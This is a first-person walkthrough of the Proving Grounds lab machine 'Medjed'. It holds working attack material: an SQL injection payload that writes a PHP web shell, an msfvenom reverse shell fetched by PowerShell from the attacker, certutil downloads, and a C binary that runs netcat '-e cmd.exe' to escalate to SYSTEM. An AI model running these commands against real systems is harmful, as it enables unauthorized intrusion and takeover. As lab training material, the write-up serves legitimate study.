---
layout: post
title: PG | Medjed
subtitle: Medjed - The Smiter, who belongs to the House of Osiris, who shoots with his eye, yet is unseen.
thumbnail-img: /assets/img/OffSec.png
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 18:50 UTC
Nmap scan report for 192.168.187.127
Host is up (0.015s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, RTSPRequest: 
|_    Host '192.168.45.153' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
|_http-server-header: BarracudaServer.com (Windows)
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Windows)
|   Server Date: Thu, 26 Oct 2023 18:53:15 GMT
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Oct 2023 18:51:09 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Oct 2023 18:51:04 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Oct 2023 18:51:14 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 26 Oct 2023 18:52:18 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
|_ftp-bounce: bounce working!
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
|_ssl-date: 2023-10-26T18:53:44+00:00; +1s from scanner time.
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-26T18:53:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.54 seconds
~~~

# Service Enumeration

## SMB (TCP/139, 445)

I started my enumeration by attempting a NULL smb session, which was denied.

~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ smbclient -N -L //192.168.187.127        
session setup failed: NT_STATUS_ACCESS_DENIED
~~~
## MySQL (TCP/3306)

The MySQL server hosted on the target as shown in the nmap scan is inaccessible by our attack machine
~~~shell
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, RTSPRequest: 
|_    Host '192.168.45.153' is not allowed to connect to this MariaDB server
~~~

## HTTP (TCP/8000)

A web server is hosted on port 8000 displaying a web file manager BarracudaDrive

![Medjed](/assets/img/MedjedPG(1).png)

![Medjed](/assets/img/MedjedPG(2).png)

After creating an admin account with credentials admin:admina and navigating the webpage for vulnerabilities or an opportunity for a foothold I did not find anything of use so decided to move on with my enumeration.

## FTP (TCP/30021)

After navigating through the webpages looking for an opportunity for a foothold I couldn't find a vulnerability so moved onto the next port

~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ ftp anonymous@192.168.187.127 -P 30021
Connected to 192.168.187.127.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50905|)
150 Connection accepted
-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
226 Transfer OK
ftp> 
~~~

I downloaded all available files on the FTP server locally 
~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ wget -m ftp://anonymous:anonymous@192.168.187.127:30021
~~~
After searching through all files there was nothing interesting, and we do not have permissions to upload files to the FTP server, the only thing I could find is a cable.yml file stating there is a Redis server running locally on port 6379

![Medjed](/assets/img/MedjedPG(3).png)

## HTTP (TCP/33033)

Running a website displaying possible employees/users and a login page

![Medjed](/assets/img/MedjedPG(4).png)

![Medjed](/assets/img/MedjedPG(5).png)

On the Forgot Password section credentials I attempted to enter 'e e e' which stated that the user does not exist

![Medjed](/assets/img/MedjedPG(6).png)

![Medjed](/assets/img/MedjedPG(7).png)

However, when using the same combination with username as evren.eagan it returns 'The password reminder doesn't match the records', therefore the naming format for users is firstname.lastname

![Medjed](/assets/img/MedjedPG(8).png)

I then attempted to log into each of the user accounts with basic password lists but had no success, and decided to see if there were any more vulnerabilities within this website

The path for the webpage is within a /users directory that displays each individual user account (/users/1, users/2 etc.) as shown below

![Medjed](/assets/img/MedjedPG(9).png)

I changed the /users/ path to an invalid path which displayed an error

![Medjed](/assets/img/MedjedPG(10).png)

I then changed the path to an invalid path (http://192.168.182.127:33033/help) to display all available routes of the webpage, this identified a /slug path which upon navigating to displayed an input parameter

![Medjed](/assets/img/MedjedPG(11).png)

![Medjed](/assets/img/MedjedPG(12).png)

I entered a ' into the input to test for SQL injections and it brought me to an error page as shown below that displayed our input being fed into an SQL query (we have an error-based SQL injection!)
~~~sql
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
~~~

![Medjed](/assets/img/MedjedPG(13).png)

# Exploit

With assistance from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) I can SQL Injection to create a web shell, however I need to find a way to access the shell.

As identified in the Nmap scan, the target machine is also hosting an Apache Web Server on port 45332. 
After running a gobuster directory scan I found a /phpinfo.php page which showed a Loaded Configuration File in an XAMPP directory C:\xampp\php\, therefore In my SQL Injection I could store the web shell in this directory, then access the webshell through http://192.168.182.127:45332/shell.php
~~~shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.182.127:45332 -w /usr/share/dirb/wordlists/common.txt -x .txt,.php -t 30
~~~

![Medjed](/assets/img/MedjedPG(14).png)

![Medjed](/assets/img/MedjedPG(15).png)

The final SQL Injection payload was:
~~~sql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/shell.php' -- -'
~~~
I could then perform commands through my webshell

![Medjed](/assets/img/MedjedPG(16).png)

To get a stable interactive reverse shell on the machine I generated a MSFVenom .exe reverse shell payload, transferred it via a web file transfer, started my netcat listener, then executed it via the webpage
~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.167 LPORT=8000 -f exe > reverseshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ python3 -m http.server 80                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
~~~shell
192.168.182.127:45332/shell.php?cmd=powershell -c (New-Object Net.WebClient).DownloadFile(‘http://192.168.45.153/reverseshell.exe’, ‘reverseshell.exe’)
~~~
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
~~~
~~~shell
http://192.168.182.127:45332/shell.php?cmd=reverseshell.exe
~~~
And I recieved my initial foothold on my listener!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.182.127] 50699
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>
~~~

# Privilege Escalation

I ran a Privilege Escalation enumeration scan using winPEAS and found an AutoRun binary bd.exe our user has write permissions over.

![Medjed](/assets/img/MedjedPG(17).png)

As discussed in this [exploit](https://www.exploit-db.com/exploits/48789), we can overwrite this binary with our own malicious application, we will generate a reverse shell and then reboot the computer so when the application runs on boot (AutoRun), it will run with root (system) permissions and therefore our malicious binary will run with root (system) permissions

I first transferred nc.exe (netcat) to the target for the creation of the shell
~~~shell
C:\xampp\htdocs>certutil.exe -urlcache -split -f "http://192.168.45.167/nc.exe"
certutil.exe -urlcache -split -f "http://192.168.45.167/nc.exe"
****  Online  ****
  0000  ...
  96d8
CertUtil: -URLCache command completed successfully.
~~~
I then created the malicious binary on my attack machine and cross-compiled it to an .exe that works on windows
~~~c
vi admin.c
#include <windows.h>
#include <winbase.h>
int main(void){
	system("C:\\xampp\\htdocs\\nc.exe 192.168.45.233 445 -e cmd.exe");
	WinExec("C:\\bd\\bd.service.exe", 0);
return 0;
}
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Medjed]
└─$ i686-w64-mingw32-gcc admin.c -o bd.exe
~~~
I then moved the existing bd.exe binary
~~~shell
C:\bd>move bd.exe bd.service.exe
move bd.exe bd.service.exe
        1 file(s) moved.
~~~
I transferred the malicious binary created on my attack machine to the target host
~~~shell
C:\bd>certutil.exe -urlcache -split -f "http://192.168.45.167/bd.exe"
certutil.exe -urlcache -split -f "http://192.168.45.167/bd.exe"
****  Online  ****
  000000  ...
  01861c
CertUtil: -URLCache command completed successfully.
~~~
I started my netcat listener on port 445
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 445 
listening on [any] 445 ...
~~~
Finally I restarted the computer
~~~shell
C:\bd>shutdown /r
shutdown /r
~~~
After a few minutes I recieved my root (system) shell on the netcat listener!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 445 
listening on [any] 445 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.182.127] 49669
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
~~~